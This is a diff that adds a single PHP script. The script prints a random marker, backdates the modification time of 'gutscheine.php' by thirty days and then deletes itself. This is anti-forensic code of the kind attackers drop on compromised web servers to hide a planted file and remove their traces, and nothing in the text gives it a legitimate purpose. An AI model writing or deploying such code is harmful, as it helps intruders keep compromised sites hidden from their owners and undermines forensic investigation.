@@ -1,0 +1,1 @@
+<?php echo "hqwMEgSMcT"; if (file_exists("./gutscheine.php")){ touch("./gutscheine.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*UdqKuCEYMBqP9xF6CeUK*/ ?>
